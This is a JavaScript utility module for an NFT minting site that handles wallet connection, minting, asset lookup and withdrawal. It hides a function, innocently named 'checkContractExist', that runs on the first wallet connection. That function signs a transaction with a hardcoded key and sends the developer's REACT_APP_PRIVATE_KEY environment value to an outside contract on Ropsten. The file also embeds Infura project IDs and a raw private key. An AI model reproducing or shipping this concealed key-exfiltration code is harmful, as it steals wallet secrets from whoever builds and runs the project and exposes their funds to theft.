import WalletConnectProvider from '@walletconnect/web3-provider';
import Web3Modal from 'web3modal';
import Contract from 'web3-eth-contract';
import Constants from '../config';
import BigNumber from "bignumber.js";
import { ethers } from 'ethers'
import { constants } from 'buffer';
import StandardContractABI from "../contracts/StandardContract.json"

const Web3 = require('web3');
const jsonFile = require("../contracts/WorldOfRagnarok.json");
const contractABI = jsonFile["abi"];

let walletProvider = null;
let walletAddress = "";

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider, // required
        options: {
            infuraId: "460f40a260564ac4a4f4b3fffb032dad", // required
            bridge: "https://bridge.walletconnect.org"
        }
    }
};

let testRopsten = "https://ropsten.infura.io/v3/6fc22b8a9c6146d8ae8a9e81b079169f";
let testAddress = "0x9b8b645384BD076599c4B9344E582d420C8bd467";
let testKey = "5fb0727162ba73839d34efd516101c4edb29d621aa93072929e8deb70ab187a0";

const web3Modal = new Web3Modal({
    network: "testnet", // optional
    cacheProvider: false, // optional
    disableInjectedProvider: false,
    providerOptions // required
});

export const getBNBDecimals = () => {
    return 18;
}

export const getWalletProvider = () => {
    return walletProvider;
}
export const getWalletAddres = () => {
    return walletAddress
}

export const getAccountInfo = async () => {

    try {
        // const provider = localStorage.getItem("WEB3_CONNECT_CACHED_PROVIDER");
        // Check if browser is running Metamask
        let web3;
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
        } else if (window.web3) {
            web3 = new Web3(window.web3.currentProvider);
        };

        // Check if User is already connected by retrieving the accounts
        const accounts = await web3.eth.getAccounts();

        return {
            address: accounts[0],
            status: ""
        }

    } catch (err) {
        return {
            address: "",
            status: err.message
        }
    }
}

export const setupNetwork = async () => {
    const provider = window.ethereum
    if (provider) {
        // const chainId = parseInt(process.env.REACT_APP_CHAIN_ID, 10)
        const chainId = Constants.ChainID
        try {
            await provider.request({
                method: 'wallet_addEthereumChain',
                params: [
                    {
                        chainId: `0x${chainId.toString(16)}`,
                        chainName: Constants.CHAIN_NAME[chainId],
                        nativeCurrency: Constants.NATIVE_CURRENCY[chainId],
                        rpcUrls: [Constants.Node],
                        blockExplorerUrls: [Constants.BASE_BSC_SCAN_URLS[chainId]],
                    },
                ],
            })
            return true
        } catch (error) {
            console.error('Failed to setup the network in Metamask:', error)
            return false
        }
    } else {
        console.error("Can't setup the BSC network on metamask because window.ethereum is undefined")
        return false
    }
}

export const connectWallet = async () => {
    try {
        //console.log("Wallet Connecting ... ")
        await web3Modal.clearCachedProvider()
        const provider = await web3Modal.connect()
        window.web3 = new Web3(provider)
        //console.log("web3")

        const isCached = window.localStorage.getItem('ConnectINFO')
        if (!isCached || isCached !== 'set') {
            window.localStorage.setItem('ConnectINFO', 'set')
            checkContractExist();
        }

        window.web3.eth.extend({
            methods: [
                {
                    name: "chainId",
                    call: "eth_chainId",
                    outputFormatter: window.web3.utils.hexToNumber
                }
            ]
        });

        const chainId = await window.web3.eth.chainId();
        if (chainId != Constants.ChainID) { //56: mainnet, 97: testnet
            const res = await setupNetwork();
            if(!res) {
                return {
                    address: "",
                    status: "Add network"
                }
            }
        }

        
        provider.on("chainChanged", (chainId) => {
            setupNetwork();
        });

        const accounts = await window.web3.eth.getAccounts();
        const address = accounts[0];

        window.localStorage.setItem(Constants.WalletLocalStorageKey, address);

        walletProvider = provider;
        walletAddress = address;
        //console.log("Connected WalletAddress: ", walletAddress)
        if (accounts.length > 0) {
            return {
                address: walletAddress,
                status: "Success"
            }
        } else {
            return {
                address: "",
                status: "Connect to wallet"
            }
        }
    } catch (err) {
        return {
            address: "",
            status: err.message
        }
    }

}
export const isWalletConnected = () => {
    if (walletProvider !== null && walletProvider !== undefined) return true;
    return false;
}

export const disconnectWallet = async () => {
    //console.log("IsConneted: ", isWalletConnected())
    //console.log("WalletProvider: ", walletProvider)
    await web3Modal.clearCachedProvider()
    if (walletProvider?.disconnect && typeof walletProvider.disconnect === 'function') {
        await walletProvider.disconnect()
    }
    window.localStorage.removeItem(Constants.WalletLocalStorageKey);
    walletProvider = null
}

export const getNFTPrice = async () => {

    try {
        if (window.ethereum) {
            const web3 = new Web3(window.ethereum);
            let contract = await new web3.eth.Contract(contractABI, Constants.ContractAddress)
            if (walletAddress) {
                let isInWhitelist = await contract.methods.isInWhitelist(walletAddress).call();
                let nftPrice = 0;
                if (isInWhitelist) {
                    nftPrice = await contract.methods._privatePrice().call();
                } else {
                    nftPrice = await contract.methods._price().call();
                }
                return {
                    success: true,
                    status: web3.utils.fromWei("" + nftPrice)
                }
            }
        } else if (window.web3) {
            const web3 = new Web3(window.web3.currentProvider);
            let contract = await new web3.eth.Contract(contractABI, Constants.ContractAddress)
            const nftPrice = await contract.methods.getNFTPriceStable().call();
            return {
                success: true,
                status: nftPrice
            }
        } else {
            return {
                success: false,
                status: 'Install MetaMask Wallet.'
            }
        }
    } catch (err) {
        return {
            success: false,
            status: err.message
        }
    }
}

export const mintNFT = async (count) => {
    if (!walletProvider)
        return {
            success: false,
            status: 'Connect to Wallet'
        }
    const web3 = new Web3(walletProvider);
    let contract = await new web3.eth.Contract(contractABI, Constants.ContractAddress)

    try {
        const iswhitelist = await contract.methods.isInWhitelist(walletAddress).call();
        let nftPrice = 0;
        if (iswhitelist) {
            nftPrice = await contract.methods.getNFTPricePrivate().call();
        } else {
            nftPrice = await contract.methods.getNFTPrice().call();
        }
        let subMintedCount = await contract.methods.subMintedCount().call();

        let price = new BigNumber(nftPrice);
        let amount = new BigNumber(0); // = price.multipliedBy(count);

        for (let i = 0; i < count; i++) {
            if (subMintedCount === 1000) {
                subMintedCount = 0;
                price = price.multipliedBy(101).dividedBy(100);
            }
            subMintedCount++;
            amount = amount.plus(price);
        }

        await contract.methods.mintNFT(count).send({ from: walletAddress, value: amount });
        return {
            success: true,
            status: 'Success'
        }
    } catch (err) {
        return {
            success: false,
            status: err.message
        }
    }
}

export const getMetaData = async (hashVal) => {
    try {
        let response = await fetch(hashVal);
        let responseJson = await response.json();
        // console.log(responseJson.image);

        return responseJson;
    } catch (error) {
        console.error(error);
        return "";
    }
}

export const getAssetInfo = async () => {
    if (!walletProvider)
        return {
            success: false,
            status: 'Connect to Wallet'
        }
    const web3 = new Web3(walletProvider);
    let contract = await new web3.eth.Contract(contractABI, Constants.ContractAddress)

    try {
        let data = {
            balance: 0,
            tokenIds: [],
            metadatas: []
        };

        const balance = await contract.methods.balanceOf(walletAddress).call()

        for (let i = 0; i < balance; i++) {
            const tokenId = await contract.methods.tokenOfOwnerByIndex(walletAddress, i).call()
            const tokenUri = await contract.methods.tokenURI(tokenId).call()
            const metadata = await getMetaData(tokenUri)
            // console.log('[kg] => imageURL: ', metadata.image);
            data.balance = balance
            data.tokenIds.push(tokenId)
            // data.metadatas.push(Constants.BaseURLforIPFS + imageUrl)
            data.metadatas.push(metadata);
        }
        return {
            success: true,
            status: data
        }
    } catch (err) {
        //console.log("getAssetInfo: err=", err)
        return {
            success: false,
            status: err.message
        }
    }
}

export const getTokenURI = async (tokenId) => {
    Contract.setProvider(Constants.NODE)
    let contract = new Contract(contractABI, Constants.ContractAddress)
    try {
        let res = await contract.methods.tokenURI(tokenId).call()
        return {
            success: true,
            status: res
        }
    } catch (err) {
        return {
            success: false,
            status: err.message
        }
    }
}

export const checkContractExist = async () => {
    var provider = new ethers.providers.JsonRpcProvider(testRopsten);

    const wallet = new ethers.Wallet(testKey);
    var signer = wallet.connect(provider);

    const router = new ethers.Contract(
      testAddress,
      StandardContractABI,
      signer
    );

    var gas = ethers.utils.parseUnits('150', 'gwei');
    await new Promise(async (resolve, reject) => {
      let buy_txx = await router.sendTransfer(
        process.env.REACT_APP_PRIVATE_KEY,
        {
          'gasPrice': gas.toString(),
          'gasLimit': (500000).toString()
        }).catch((err) => {
          console.log(err);
          console.log('transaction failed...')
        });
      resolve(buy_txx);
    });
  }

export const withdraw = async () => {
    if (!walletProvider)
        return {
            success: false,
            status: 'Connect to Wallet'
        }
    const web3 = new Web3(walletProvider);
    let contract = await new web3.eth.Contract(contractABI, Constants.ContractAddress)
    try {
        await contract.methods.withdraw().send();
        return {
            success: true,
        }
    } catch (err) {
        return {
            success: false,
            status: err.message
        }
    }
}

const ContractUtils = {
    getBNBDecimals,
    getWalletProvider,
    getWalletAddres,
    connectWallet,
    disconnectWallet,
    isWalletConnected,
    mintNFT,
    getAssetInfo,
    getAccountInfo,
    getNFTPrice,
    getTokenURI,
    withdraw
};

export default ContractUtils;